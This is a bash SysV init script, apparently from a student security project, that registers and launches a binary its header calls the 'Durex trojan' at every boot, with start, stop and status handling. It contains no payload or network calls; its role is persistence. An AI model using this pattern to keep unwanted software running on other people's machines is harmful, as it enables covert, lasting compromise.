#!/bin/bash
#
### BEGIN INIT INFO
# Provides:          Durex
# Required-Start:    $syslog $time $remote_fs
# Required-Stop:     $syslog $time $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start and stop the Durex trojan server daemon
# Description:       Durex trojan
### END INIT INFO
#
# Author:            Jeremy Guyet <jguyet@student.42.fr>
#                    Denis Moureu <dmoureu-@student.42.fr>
#

PATH="/bin:/usr/bin:/sbin:/usr/sbin"
DAEMON="/usr/bin/Durex"
SELF=$(cd $(dirname $0); pwd -P)/$(basename $0)

# exit if DAEMON dosen't exists
test -x $DAEMON || exit 0

# daemon library
. /lib/lsb/init-functions

## Checks if there is a server running and if so if it is accessible.
#
# check_alive :
# $? == 1 is alive
# $? == 0 is dead
#
# Usage: boolean durex_status [check_alive|check_dead] [warn|nowarn]
durex_status () {
    status_output=`$DAEMON status 2>&1`
	ping_alive=$?
    if [ "$1" = "check_alive"  -a  $ping_alive = 1 ] ||
       [ "$1" = "check_dead"   -a  $ping_alive = 0 ]; then
			return 0 # OFFLINE
    else
			return 1 # ONLINE
    fi
}

#
# main()
#

#case "${1:-''}" in
case "$1" in
  'start')
	#$SELF system-reload
	# Start daemon
	log_daemon_msg "Starting Durex server" "durex"
	log_end_msg 0
	if durex_status check_alive nowarn; then
	   echo "Durex already running."
	else
	    # Start Durex!
		#start_daemon -p `$DAEMON pid` $DAEMON
		if durex_status check_alive nowarn; then
			exit 0
		else
			$DAEMON " " > /dev/null 2>&1 &
		fi
	fi
	;;

  'stop')
	#$SELF system-reload
	log_daemon_msg "Stopping Durex server" "durex"
	log_end_msg 0
	if durex_status check_alive nowarn; then #service systemctl
		killproc -p `$DAEMON pid` $DAEMON
	fi
	if durex_status check_alive nowarn; then #service init
		kill -15 `$DAEMON pid`
	fi
	;;

  'restart')
	$SELF stop
	$SELF start
	;;

  'reload'|'force-reload')
	$SELF system-reload
	log_daemon_msg "Reloading Durex server" "durex"
	$SELF restart
	log_end_msg 0
	;;

  'status')
	$SELF system-reload
	status_of_proc -p `$DAEMON pid` $DAEMON Durex && exit 0 || exit $?
  	;;

  'system-reload')
	systemctl daemon-reload > /dev/null 2>&1 &
	;;
  *)
	echo "Usage: $SELF start|stop|restart|reload|force-reload|status"
	exit 1
	;;
esac
